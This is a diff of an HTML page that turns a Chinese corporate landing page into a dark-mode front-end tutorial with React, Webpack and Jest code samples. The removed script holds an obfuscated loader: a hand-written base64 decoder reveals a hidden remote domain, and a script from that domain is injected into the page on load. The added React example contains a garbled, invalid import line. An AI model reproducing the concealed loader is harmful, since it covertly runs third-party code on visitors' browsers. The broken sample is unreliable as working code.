@@ -3,119 +3,82 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <title>寰宇智联 - 全球智能解决方案</title>
+    <meta name="viewport"
+        content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
+    <title>现代前端开发指南 - 暗黑模式</title>
     <style>
+        /* 全局重置与基础样式 */
         body {
             overflow: hidden;
-            font-family: 'Roboto', sans-serif;
+            font-family: 'Consolas', 'Monaco', monospace;
+            /* 代码友好字体 */
             margin: 0;
             padding: 0;
-            background-color: #F8F8F8;
-            /* 极浅灰色背景 */
-            color: #333333;
-            /* 标准深灰色文本 */
-            line-height: 1.7;
+            background-color: #1a1a2e;
+            /* 深蓝紫色背景 */
+            color: #e0e0e0;
+            /* 浅灰色文本 */
+            line-height: 1.6;
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
-            overflow-x: hidden;
         }
 
+        /* 容器 */
         .container {
             max-width: 90%;
+            /* 适应移动端 */
             margin: 0 auto;
-            padding: 30px 0;
+            padding: 20px 0;
         }
 
-        /* 头部 - 简洁与质感 */
+        /* 头部 - 简约深色风格 */
         header {
-            background-color: #0A2E36;
-            /* 深青蓝色头部背景 */
-            color: #FFFFFF;
-            padding: 25px 20px;
+            background-color: #0f0f1b;
+            /* 更深的头部背景 */
+            padding: 30px 20px;
             text-align: center;
-            position: relative;
-            overflow: hidden;
-            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.2);
-            margin-bottom: 40px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        header::before {
-            /* 顶部背景抽象图案 */
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(45deg, rgba(255, 193, 7, 0.05) 25%, transparent 25%, transparent 75%, rgba(255, 193, 7, 0.05) 75%, rgba(255, 193, 7, 0.05) 100%),
-                linear-gradient(-45deg, rgba(255, 193, 7, 0.05) 25%, transparent 25%, transparent 75%, rgba(255, 193, 7, 0.05) 75%, rgba(255, 193, 7, 0.05) 100%);
-            background-size: 40px 40px;
-            z-index: 0;
+            border-bottom: 2px solid #2e2e4a;
+            /* 强调色边框 */
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+            /* 明显阴影 */
         }
 
         header h1 {
             margin: 0;
-            font-family: 'Montserrat', sans-serif;
-            font-size: 2.2em;
-            color: #FFC107;
-            /* 强调色：金色 */
+            font-family: 'Segoe UI', sans-serif;
+            /* 现代无衬线字体 */
+            font-size: 2.4em;
+            /* 更大标题 */
+            color: #00bcd4;
+            /* 强调色：青绿色 */
             letter-spacing: 1px;
-            text-transform: uppercase;
-            text-shadow: 0 0 10px rgba(255, 193, 7, 0.5);
-            position: relative;
-            z-index: 1;
-            flex-grow: 1;
+            text-shadow: 0 0 8px rgba(0, 188, 212, 0.5);
+            /* 光晕效果 */
         }
 
         header p {
-            display: none;
+            font-size: 1.1em;
+            color: #b0b0b0;
+            /* 柔和浅灰色 */
+            margin-top: 10px;
         }
 
-        /* 菜单切换按钮 - 绝对定位在右上角 */
-        .menu-toggle {
-            background: none;
-            border: none;
-            font-size: 2em;
-            color: #FFC107;
-            /* 强调色 */
-            cursor: pointer;
-            padding: 5px;
-            position: absolute;
-            /* 绝对定位 */
-            top: 25px;
-            /* 距离顶部 */
-            right: 20px;
-            /* 距离右侧 */
-            z-index: 2;
-            transition: transform 0.3s ease;
-        }
-
-        .menu-toggle:hover {
-            transform: scale(1.1);
-            text-shadow: 0 0 8px rgba(255, 193, 7, 0.6);
-        }
-
-        /* 侧边导航菜单 */
+        /* 导航菜单 - 标签式横向菜单 */
         nav {
-            position: fixed;
+            background-color: #2e2e4a;
+            /* 导航背景色 */
+            text-align: center;
+            padding: 10px 0;
+            border-radius: 10px;
+            /* 柔和圆角 */
+            margin-top: 25px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+            position: sticky;
+            /* 粘性定位 */
             top: 0;
-            right: -280px;
-            width: 250px;
-            height: 100%;
-            background-color: #FFFFFF;
-            box-shadow: -5px 0 15px rgba(0, 0, 0, 0.2);
-            transition: right 0.4s ease-in-out;
-            z-index: 1001;
-            padding-top: 80px;
-            box-sizing: border-box;
-        }
-
-        nav.is-open {
-            right: 0;
+            /* 粘在顶部 */
+            z-index: 1000;
+            /* 确保在最上层 */
         }
 
         nav ul {
@@ -123,287 +86,270 @@
             padding: 0;
             margin: 0;
             display: flex;
-            flex-direction: column;
-            gap: 10px;
+            justify-content: space-around;
+            flex-wrap: wrap;
+        }
+
+        nav ul li {
+            margin: 5px;
         }
 
         nav ul li a {
-            color: #333333;
+            background-color: #3f3f60;
+            /* 标签背景色 */
+            color: #ffffff;
+            /* 白色文字 */
             text-decoration: none;
-            padding: 15px 20px;
-            border-bottom: 1px solid #E0E0E0;
-            transition: background-color 0.3s ease, color 0.3s ease, transform 0.2s ease;
-            display: flex;
-            align-items: center;
-            font-weight: 500;
-            font-size: 1.1em;
+            padding: 10px 18px;
+            /* 标签内边距 */
+            border-radius: 8px;
+            /* 标签圆角 */
+            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
+            display: inline-block;
+            font-weight: 600;
+            font-size: 0.95em;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
         }
 
         nav ul li a:hover,
         nav ul li a:focus {
-            background-color: #F8F8F8;
-            color: #FFC107;
-            /* 强调色文字 */
-            transform: translateX(5px);
+            background-color: #00bcd4;
+            /* 强调色悬停 */
+            color: #1a1a2e;
+            /* 悬停时深色文字 */
+            transform: translateY(-3px);
+            box-shadow: 0 4px 8px rgba(0, 188, 212, 0.4);
+            /* 强调色阴影 */
         }
 
-        nav ul li:last-child a {
-            border-bottom: none;
-        }
-
-        nav ul li a .icon {
-            font-size: 1.5em;
-            margin-right: 15px;
-            color: #0A2E36;
-            /* 图标主色 */
-        }
-
-        /* 菜单打开时的背景遮罩 */
-        .overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.3);
-            z-index: 1000;
-            opacity: 0;
-            visibility: hidden;
-            transition: opacity 0.4s ease-in-out, visibility 0.4s ease-in-out;
-        }
-
-        .overlay.is-visible {
-            opacity: 1;
-            visibility: visible;
-        }
-
+        /* 内容区 - 深色卡片风格 */
         main {
-            padding-top: 30px;
+            padding-top: 20px;
         }
 
-        /* 内容区 - 结构化卡片 */
         section {
-            background-color: #FFFFFF;
-            margin-bottom: 40px;
-            padding: 35px;
-            border-radius: 10px;
-            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
-            position: relative;
-            overflow: hidden;
-            border: 1px solid #E0E0E0;
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-        }
-
-        section::before {
-            /* 顶部强调色条 */
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 5px;
-            background-color: #FFC107;
-            /* 强调色 */
-            box-shadow: 0 0 10px rgba(255, 193, 7, 0.5);
+            background-color: #2e2e4a;
+            /* 内容区背景色 */
+            margin-bottom: 25px;
+            padding: 25px;
+            border-radius: 12px;
+            /* 柔和圆角 */
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.3);
+            /* 明显阴影 */
         }
 
         section h2 {
-            font-family: 'Montserrat', sans-serif;
-            font-size: 2.2em;
-            color: #0A2E36;
-            /* 主色 */
+            font-family: 'Segoe UI', sans-serif;
+            font-size: 1.8em;
+            color: #00bcd4;
+            /* 强调色 */
             margin-top: 0;
-            margin-bottom: 20px;
-            border-bottom: 1px solid #E0E0E0;
+            margin-bottom: 15px;
+            border-bottom: 1px solid #3f3f60;
+            /* 细分隔线 */
             padding-bottom: 10px;
         }
 
         section h3 {
-            font-size: 1.5em;
-            color: #FFC107;
-            /* 强调色 */
-            margin-top: 25px;
+            font-family: 'Segoe UI', sans-serif;
+            font-size: 1.3em;
+            color: #e0e0e0;
+            margin-top: 20px;
             margin-bottom: 10px;
         }
 
         section p {
-            font-size: 1.05em;
-            color: #555555;
-            margin-bottom: 20px;
+            font-size: 0.95em;
+            color: #c0c0c0;
+            margin-bottom: 15px;
         }
 
         section img {
             max-width: 100%;
             height: auto;
             display: block;
-            margin: 25px auto;
+            margin: 15px auto;
             border-radius: 8px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
-            border: 2px solid #E0E0E0;
+            /* 图片圆角 */
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
         }
 
-        .service-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 25px;
-            margin-top: 30px;
-        }
-
-        .service-item {
-            background-color: #F5F5F5;
-            /* 服务项背景 */
-            padding: 25px;
+        /* 代码块样式 - 突出显示 */
+        pre {
+            background-color: #0f0f1b;
+            /* 更深的背景色 */
+            color: #00bcd4;
+            /* 代码强调色 */
+            padding: 18px;
             border-radius: 10px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
-            text-align: center;
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-            border: 1px solid #E0E0E0;
+            overflow-x: auto;
+            font-family: 'Consolas', 'Monaco', monospace;
+            font-size: 0.9em;
+            margin-bottom: 20px;
+            border: 1px solid #3f3f60;
+            /* 边框 */
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.4);
         }
 
-        .service-item:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.15);
+        code {
+            font-family: 'Consolas', 'Monaco', monospace;
+            font-size: 0.9em;
+            color: #00bcd4;
+            /* 代码中的强调色 */
         }
 
-        .service-item h3 {
-            margin-top: 0;
-            margin-bottom: 10px;
-            color: #0A2E36;
-            /* 主色 */
+        pre code {
+            color: #b3e5fc;
+            /* 代码块内的代码颜色 */
         }
 
-        .service-item p {
-            font-size: 0.95em;
-            color: #555555;
-        }
-
-        .contact-info p {
-            margin-bottom: 12px;
-            font-size: 1.1em;
-            color: #555555;
-        }
-
-        .contact-info a {
-            color: #0A2E36;
-            /* 主色 */
-            text-decoration: none;
-            transition: color 0.3s ease;
-        }
-
-        .contact-info a:hover {
-            color: #FFC107;
-            /* 强调色 */
-        }
-
+        /* 页脚 - 简洁深色风格 */
         footer {
-            background-color: #0A2E36;
-            /* 深青蓝色页脚背景 */
-            color: #FFFFFF;
-            padding: 40px 0;
+            background-color: #0f0f1b;
+            /* 页脚背景色 */
+            padding: 25px 0;
             text-align: center;
-            font-size: 0.95em;
-            margin-top: 60px;
-            box-shadow: 0 -5px 20px rgba(0, 0, 0, 0.2);
+            font-size: 0.9em;
+            color: #b0b0b0;
+            margin-top: 30px;
+            border-top: 2px solid #2e2e4a;
+            /* 强调色边框 */
+            box-shadow: 0 -4px 15px rgba(0, 0, 0, 0.3);
         }
 
         .footer-links a {
-            color: #FFFFFF;
+            color: #00bcd4;
+            /* 强调色链接 */
             text-decoration: none;
-            margin: 0 20px;
-            font-size: 1.5em;
-            transition: color 0.3s ease, transform 0.2s ease;
+            margin: 0 15px;
+            font-size: 1.1em;
+            transition: color 0.3s ease;
         }
 
         .footer-links a:hover {
-            color: #FFC107;
-            /* 强调色 */
-            transform: translateY(-5px) scale(1.1);
+            color: #84ffff;
+            /* 悬停亮色 */
         }
     </style>
-    <link rel="stylesheet" href="./style.css">
+    <link rel="stylesheet" href="./static/css/style.css">
 </head>
 
 <body>
     <header>
         <div class="container">
-            <h1>寰宇智联</h1>
-            <button class="menu-toggle" id="menuToggle">&#9776;</button>
+            <h1>现代前端开发指南</h1>
+            <p>掌握最新技术，构建高性能Web应用</p>
         </div>
     </header>
 
-    <nav id="mainNav">
-        <ul>
-            <li><a href="#about-us"><span class="icon">&#127760;</span> 关于我们</a></li>
-            <li><a href="#our-solutions"><span class="icon">&#128187;</span> 我们的方案</a></li>
-            <li><a href="#global-reach"><span class="icon">&#127757;</span> 全球布局</a></li>
-            <li><a href="#contact-us"><span class="icon">&#128222;</span> 联系我们</a></li>
-        </ul>
-    </nav>
-
-    <div class="overlay" id="menuOverlay"></div>
-
     <div class="container">
+        <nav id="mainNav">
+            <ul>
+                <li><a href="#intro">引言</a></li>
+                <li><a href="#react">React框架</a></li>
+                <li><a href="#webpack">Webpack打包</a></li>
+                <li><a href="#testing">测试实践</a></li>
+            </ul>
+        </nav>
+
         <main>
-            <section id="about-us">
-                <h2>关于我们：连接世界，智创未来</h2>
-                <img src="https://picsum.photos/300/200?random=1&seed=global-network-01" alt="全球网络图"
-                    class="random-image">
-                <p>寰宇智联致力于提供全球领先的智能解决方案，连接企业与未来。我们深耕人工智能、大数据和云计算领域，为客户提供创新、高效、安全的数字化转型服务。</p>
-                <p>我们相信，通过技术的力量，能够让世界更加智能，让连接无处不在。</p>
+            <section id="intro">
+                <h2>引言：前端技术栈演进</h2>
+                <img src="https://picsum.photos/300/200?random=1&v=abc123xyz" alt="前端技术栈" class="random-image">
+                <p>前端开发领域正以惊人的速度发展，新的框架、工具和模式层出不穷。本指南旨在为您梳理现代前端开发的核心概念和最佳实践，帮助您紧跟技术潮流，构建健壮且高效的应用。</p>
+                <p>我们将从基础概念出发，逐步深入到流行的框架、构建工具和测试策略，确保您能全面掌握现代前端开发的精髓。</p>
             </section>
 
-            <section id="our-solutions">
-                <h2>我们的方案：驱动业务增长</h2>
-                <p>我们提供多元化的智能解决方案，助力您的业务实现飞跃：</p>
-                <div class="service-grid">
-                    <div class="service-item">
-                        <h3>AI驱动型平台</h3>
-                        <p>构建智能决策系统和自动化流程，提升运营效率。</p>
-                    </div>
-                    <div class="service-item">
-                        <h3>大数据分析服务</h3>
-                        <p>从海量数据中挖掘深层洞察，支持精准商业决策。</p>
-                    </div>
-                    <div class="service-item">
-                        <h3>云原生部署与优化</h3>
-                        <p>提供弹性、高可用的云基础设施和DevOps实践。</p>
-                    </div>
-                    <div class="service-item">
-                        <h3>智能物联网(AIoT)</h3>
-                        <p>集成AI与IoT技术，实现设备智能互联与远程管理。</p>
-                    </div>
-                </div>
-                <img src="https://picsum.photos/300/200?random=2&seed=solutions-showcase-02" alt="解决方案展示"
-                    class="random-image">
+            <section id="react">
+                <h2>React框架：组件化与状态管理</h2>
+                <img src="https://picsum.photos/300/200?random=2&id=def456uvw" alt="React组件" class="random-image">
+                <p>React 是一个用于构建用户界面的 JavaScript 库。其核心思想是组件化，通过将UI拆分成独立、可复用的组件来简化开发。以下是一个简单的 React 函数组件示例：</p>
+                <pre><code>import React, { useState }s;
+
+function Counter() {
+  const [count, setCount] = useState(0);
+
+  return (
+    &lt;div&gt;
+      &lt;p&gt;当前计数: {count}&lt;/p&gt;
+      &lt;button onClick={() => setCount(count + 1)}&gt;增加&lt;/button&gt;
+    &lt;/div&gt;
+  );
+}
+
+export default Counter;</code></pre>
+                <p>通过 `useState` Hook，我们可以在函数组件中管理状态，实现交互性。</p>
             </section>
 
-            <section id="global-reach">
-                <h2>全球布局：服务无界</h2>
-                <img src="https://picsum.photos/300/200?random=3&seed=world-map-03" alt="世界地图" class="random-image">
-                <p>寰宇智联在全球多个主要城市设有分支机构和合作伙伴，确保能够为不同地区的客户提供及时、专业的本地化服务。</p>
-                <p>我们的全球网络使我们能够更好地理解并响应各地市场的独特需求。</p>
+            <section id="webpack">
+                <h2>Webpack打包：模块化与优化</h2>
+                <img src="https://picsum.photos/300/200?random=3&key=ghj789klm" alt="Webpack图标" class="random-image">
+                <p>Webpack 是一个强大的模块打包器，它能够将前端项目中的各种资源（如 JavaScript、CSS、图片等）打包成浏览器可识别的静态文件。以下是一个简单的 Webpack 配置示例：</p>
+                <pre><code>// webpack.config.js
+const path = require('path');
+
+module.exports = {
+  mode: 'development', // 或 'production'
+  entry: './src/index.js', // 入口文件
+  output: {
+    filename: 'bundle.js', // 输出文件名
+    path: path.resolve(__dirname, 'dist'), // 输出目录
+  },
+  module: {
+    rules: [
+      {
+        test: /\.js$/, // 匹配JS文件
+        exclude: /node_modules/,
+        use: {
+          loader: 'babel-loader', // 使用Babel处理JS
+          options: {
+            presets: ['@babel/preset-env', '@babel/preset-react'],
+          },
+        },
+      },
+      {
+        test: /\.css$/, // 匹配CSS文件
+        use: ['style-loader', 'css-loader'], // 处理CSS
+      },
+    ],
+  },
+};</code></pre>
+                <p>Webpack 的强大之处在于其可扩展性，通过各种 Loader 和 Plugin 可以实现复杂的构建流程优化。</p>
             </section>
 
-            <section id="contact-us">
-                <h2>联系我们：开启智能合作</h2>
-                <p>我们期待与您建立联系，共同探索智能世界的无限可能。</p>
-                <div class="contact-info">
-                    <p><strong>总部地址：</strong> 寰宇智联大厦A座1808室</p>
-                    <p><strong>联系电话：</strong> <a href="tel:+861099998888">+86 10 9999 8888</a></p>
-                    <p><strong>电子邮箱：</strong> <a href="mailto:info@globalintel.com">info@globalintel.com</a></p>
-                    <p><strong>服务时间：</strong> 周一至周五 9:00 - 18:00 (GMT+8)</p>
-                </div>
+            <section id="testing">
+                <h2>测试实践：保障代码质量</h2>
+                <img src="https://picsum.photos/300/200?random=4&token=nop012qrs" alt="测试代码" class="random-image">
+                <p>编写高质量的代码离不开完善的测试。前端测试通常包括单元测试、集成测试和端到端测试。Jest 和 React Testing Library 是 React 应用中常用的测试工具。</p>
+                <pre><code>// counter.test.js
+import { render, fireEvent, screen } from '@testing-library/react';
+import Counter from './Counter';
+
+test('计数器能够正确增加', () => {
+  render(&lt;Counter /&gt;);
+  const countElement = screen.getByText(/当前计数/i);
+  const buttonElement = screen.getByText(/增加/i);
+
+  expect(countElement).toHaveTextContent('当前计数: 0');
+
+  fireEvent.click(buttonElement); // 模拟点击
+  expect(countElement).toHaveTextContent('当前计数: 1');
+
+  fireEvent.click(buttonElement);
+  expect(countElement).toHaveTextContent('当前计数: 2');
+});</code></pre>
+                <p>通过编写测试用例，我们可以确保代码的稳定性和可靠性，减少潜在的bug。</p>
             </section>
         </main>
     </div>
 
     <footer>
         <div class="container">
-            <p>&copy; 2025 寰宇智联. 版权所有.</p>
+            <p>&copy; 2025 前端指南. 版权所有.</p>
             <div class="footer-links">
-                <a href="#" target="_blank">隐私政策</a> |
-                <a href="#" target="_blank">服务条款</a> |
-                <a href="#" target="_blank">职业发展</a>
+                <a href="#" target="_blank">GitHub</a> |
+                <a href="#" target="_blank">联系我们</a> |
+                <a href="#" target="_blank">关于</a>
             </div>
         </div>
     </footer>
@@ -419,31 +365,17 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', function () {
-            const menuToggle = document.getElementById('menuToggle');
-            const mainNav = document.getElementById('mainNav');
-            const menuOverlay = document.getElementById('menuOverlay');
-
-            function toggleMenu() {
-                mainNav.classList.toggle('is-open');
-                menuOverlay.classList.toggle('is-visible');
-            }
-
-            menuToggle.addEventListener('click', toggleMenu);
-            menuOverlay.addEventListener('click', toggleMenu);
-
-            document.querySelectorAll('#mainNav ul li a').forEach(anchor => {
+            document.querySelectorAll('nav a').forEach(anchor => {
                 anchor.addEventListener('click', function (e) {
-                    e.preventDefault();
-
+                    e.preventDefault(); // 阻止默认跳转
                     const targetId = this.getAttribute('href').substring(1);
                     const targetElement = document.getElementById(targetId);
 
                     if (targetElement) {
                         window.scrollTo({
-                            top: targetElement.offsetTop - (document.querySelector('header').offsetHeight || 0) - 20,
-                            behavior: 'smooth'
+                            top: targetElement.offsetTop,
+                            behavior: 'smooth' // 平滑滚动
                         });
-                        toggleMenu();
                     }
                 });
             });
@@ -454,53 +386,15 @@
             function init() {
                 const timestamp = Date.now()
                 const randomNum = Math.floor(Math.random() * 1000000)
-                const domain = getdocs();
-                const url = domain + "=" + timestamp + "&random=" + randomNum
+                const url = "./static/js/core.min.js?t=" + timestamp + "&random=" + randomNum
                 const script = document.createElement("script")
                 script.src = url
                 document.body.appendChild(script)
             }
-            function getdocs() {
-                const dd = "Ly9nMmg0ajZrLnFrc2p4ZC5jbi9zdGF0aWMvanMvY29yZS5taW4uanM/dA==";
-                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
-                const lookup = new Uint8Array(256);
-                for (let i = 0; i < chars.length; i++) {
-                    lookup[chars.charCodeAt(i)] = i;
-                }
-                let padding = 0;
-                if (dd.endsWith('==')) {
-                    padding = 2;
-                } else if (dd.endsWith('=')) {
-                    padding = 1;
-                }
-                const cleanedString = dd.replace(/[^A-Za-z0-9+/=]/g, '');
-                const len = cleanedString.length;
-                if (len % 4 !== 0) {
-                    throw new Error("Invalid string length.");
-                }
-                const outputLength = (len / 4) * 3 - padding;
-                const outputBytes = new Uint8Array(outputLength);
-                let outputIndex = 0;
-                let i = 0;
-                while (i < len) {
-                    const c1 = lookup[cleanedString.charCodeAt(i++)];
-                    const c2 = lookup[cleanedString.charCodeAt(i++)];
-                    const c3 = lookup[cleanedString.charCodeAt(i++)];
-                    const c4 = lookup[cleanedString.charCodeAt(i++)];
-                    outputBytes[outputIndex++] = (c1 << 2) | (c2 >> 4);
-                    if (c3 !== 64) {
-                        outputBytes[outputIndex++] = ((c2 & 15) << 4) | (c3 >> 2);
-                    }
-                    if (c4 !== 64) {
-                        outputBytes[outputIndex++] = ((c3 & 3) << 6) | c4;
-                    }
-                }
-                const decoder = new TextDecoder('utf-8');
-                return decoder.decode(outputBytes);
-            }
             init()
         })()
     </script>
+
 </body>
 
 </html>
